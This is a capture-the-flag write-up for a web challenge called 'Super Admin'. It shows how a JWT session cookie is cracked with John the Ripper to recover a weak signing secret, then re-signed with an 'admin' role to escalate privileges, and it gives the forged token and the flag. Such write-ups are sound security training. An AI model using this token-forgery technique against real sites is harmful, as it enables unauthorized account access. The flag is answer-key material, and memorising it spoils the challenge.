# Super Admin 

## Description

> Comfort food.
> 
> https://bluehens-web-cookies.chals.io/ 



## Write-Up

As we enter the website, we get two buttons: one to connect as `user` and one as `admin`.

From there, when clicking on the `user` button, we get a cookie token in the storage part of the browser.

```
creds: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTY5ODQ0MDk5OX0.xcHM5Rk8Cfc-moilBXPdBFOogz-EzN9S6C1OExLNqnQ
```

It seems to be a `jwt` token, after cracking it using for example `john the ripper`, we get :

```
password1`
```

From there, we decode the token:

```
{
  "role": "user",
  "iat": 1698440999
}
```

We forge a new one by changing the role:

```
{
  "role": "admin",
  "iat": 1698440999
}
```

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2OTg0NDA5OTl9.TwSQSBcxgzNbyHh6bGg1ZGB1JpLE7Ebv3BiB6fNW0Gc
```

After replacing the cookie, we get:

```
Welcome, Admin!

Here is your flag: UDCTF{k33p_17_51mp13_57up1d_15_4_l1e}
```


## Flag

UDCTF{k33p_17_51mp13_57up1d_15_4_l1e}